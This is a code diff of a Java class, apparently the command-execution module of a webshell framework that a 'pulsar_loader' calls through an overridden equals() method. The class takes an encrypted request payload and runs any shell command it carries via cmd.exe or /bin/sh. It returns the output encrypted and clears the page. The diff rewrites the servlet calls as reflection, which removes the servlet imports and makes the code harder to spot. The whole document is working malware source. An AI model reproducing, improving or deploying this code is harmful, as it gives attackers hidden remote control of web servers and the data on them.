@@ -1,29 +1,26 @@
-import javax.servlet.jsp.PageContext;
-import javax.servlet.http.HttpServletRequest;
 import java.io.*;
+import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.Map;
-import java.util.*;
 
 public class DarkMatter
 {
-    private Map<String, String> ParseParams(String paramStr)
+    private Map<String, String> fnParseParams(String szParamStr)
     {
-        Map<String, String> map = new HashMap<String,String>();
-        if (paramStr == null || paramStr.trim().isEmpty())
-            return map;
+        Map<String, String> mapParams = new HashMap<String, String>();
+        if (szParamStr == null || szParamStr.trim().isEmpty())
+            return mapParams;
 
-        String[] pairs = paramStr.split("&");
-        for (String pair : pairs)
+        String[] aszPairs = szParamStr.split("&");
+        for (String szPair : aszPairs)
         {
-            int nIdx = pair.indexOf("=");
+            int nIdx = szPair.indexOf("=");
             if (nIdx > 0)
             {
-                map.put(pair.substring(0, nIdx), pair.substring(nIdx + 1));
+                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
             }
         }
-
-        return map;
+        return mapParams;
     }
 
     private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
@@ -33,40 +30,52 @@ public class DarkMatter
             if (objPageContext == null)
                 return abRawResponse;
 
-            javax.servlet.jsp.PageContext pageContext = (javax.servlet.jsp.PageContext)objPageContext;
-            javax.servlet.http.HttpSession session = pageContext.getSession();
+            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
+            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);
 
-            Object pulsarLoader = session.getAttribute("pulsar_loader");
-            if (pulsarLoader == null) return abRawResponse;
+            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
+            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
+            
+            if (objPulsarLoader == null)
+                return abRawResponse;
 
-            java.lang.reflect.Method cryptMethod = pulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
-            cryptMethod.setAccessible(true);
+            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
+            fnCrypt.setAccessible(true);
 
-            return (byte[])cryptMethod.invoke(pulsarLoader, abRawResponse, 1);
+            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
         }
-        catch (Exception ex)
+        catch (Exception exCrashed)
         {
             return abRawResponse;
         }
     }
 
     @Override
-    public boolean equals(Object obj)
+    public boolean equals(Object objParam)
     {
-        OutputStream os = null;
+        Object objPageContext = objParam;
+        Object objRequest = null;
+        Object objResponse = null;
+        OutputStream osClient = null;
+        
         try
         {
-            PageContext pageContext = (PageContext)obj;
-            HttpServletRequest request = (HttpServletRequest)pageContext.getRequest();
+            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
+            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);
 
-            os = pageContext.getResponse().getOutputStream();
+            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
+            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);
 
-            Object objPayload = request.getAttribute("payload");
-            Object objLength = request.getAttribute("len");
+            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
+            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);
+
+            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
+            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
+            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});
 
             if (objPayload == null || objLength == null)
             {
-                os.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
+                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                 return true;
             }
 
@@ -76,52 +85,61 @@ public class DarkMatter
             int nParamLength = abPayload.length - nParamOffset;
             String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();
 
-            Map<String, String> params = ParseParams(szParam);
-            String szAction = params.get("action");
+            Map<String, String> mapParams = fnParseParams(szParam);
+            String szAction = mapParams.get("action");
 
-            if (szAction.equals("CMD"))
+            if (szAction != null && szAction.equalsIgnoreCase("CMD"))
             {
-                String szCmd = params.get("cmd");
+                String szCmd = mapParams.get("cmd");
                 if (szCmd == null)
                     return true;
 
-                Process proc;
+                Process procSystem;
                 String szOsName = System.getProperty("os.name").toLowerCase();
                 if (szOsName.contains("win"))
-                    proc = Runtime.getRuntime().exec(new String[] {"cmd.exe", "/c", szCmd});
+                    procSystem = Runtime.getRuntime().exec(new String[] {"cmd.exe", "/c", szCmd});
                 else
-                    proc = Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", szCmd});
+                    procSystem = Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", szCmd});
 
-                InputStream is = proc.getInputStream();
-                InputStream es = proc.getErrorStream();
-                ByteArrayOutputStream bos = new ByteArrayOutputStream();
+                InputStream isStdout = procSystem.getInputStream();
+                InputStream isStderr = procSystem.getErrorStream();
+                ByteArrayOutputStream bosBuffer = new ByteArrayOutputStream();
 
-                byte[] abBuffer = new byte[1024];
-                int nLength = 0;
+                byte[] abChunk = new byte[1024];
+                int nReadLen = 0;
 
-                while ((nLength = is.read(abBuffer)) != -1)
-                    bos.write(abBuffer, 0, nLength);
+                while ((nReadLen = isStdout.read(abChunk)) != -1)
+                    bosBuffer.write(abChunk, 0, nReadLen);
 
-                while ((nLength = es.read(abBuffer)) != -1)
-                    bos.write(abBuffer, 0, nLength);
+                while ((nReadLen = isStderr.read(abChunk)) != -1)
+                    bosBuffer.write(abChunk, 0, nReadLen);
                 
-                byte[] abResult = bos.toByteArray();
+                byte[] abResult = bosBuffer.toByteArray();
                 if (abResult.length == 0)
-                    abResult = "CMD_SUCCESS: Command executed but returned no output".getBytes();
+                    abResult = "DARKMATTER_SUCCESS: Command executed but returned no output".getBytes();
 
-                byte[] abEncryptedResult = Encrypt(obj, abResult);
-                os.write(abEncryptedResult);
-                os.flush();
+                byte[] abEncryptedResult = Encrypt(objParam, abResult);
+                osClient.write(abEncryptedResult);
+                osClient.flush();
 
                 try
                 {
-                    javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)pageContext.getResponse();
-                    response.setStatus(200);
+                    Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
+                    fnSetStatus.invoke(objResponse, new Object[]{200});
 
-                    pageContext.getOut().clear();
-                    response.flushBuffer();
+                    try
+                    {
+                        Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
+                        Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
+                        Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
+                        fnClear.invoke(objOut, new Object[0]);
+                    }
+                    catch (Exception exIgnored) {}
+
+                    Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
+                    fnFlushBuffer.invoke(objResponse, new Object[0]);
                 }
-                catch (Exception ex)
+                catch (Exception exIgnored)
                 {
 
                 }
@@ -130,20 +148,21 @@ public class DarkMatter
             }
             else
             {
-                os.write(("CMD_ERROR: Unknown action: " + szAction).getBytes());
+                osClient.write(("DARKMATTER_ERROR: Unknown action: " + szAction).getBytes());
             }
         }
         catch (Exception ex)
         {
-            if (os != null)
+            if (osClient != null)
             {
                 try
                 {
-                    StringWriter sw = new StringWriter();
-                    ex.printStackTrace(new PrintWriter(sw));
-                    os.write(("CMD_INTERNAL_CRASHED: " + sw.toString()).getBytes());
+                    StringWriter swTrace = new StringWriter();
+                    ex.printStackTrace(new PrintWriter(swTrace));
+
+                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                 }
-                catch (Exception e) {}
+                catch (Exception exIgnored) {}
             }
         }
 
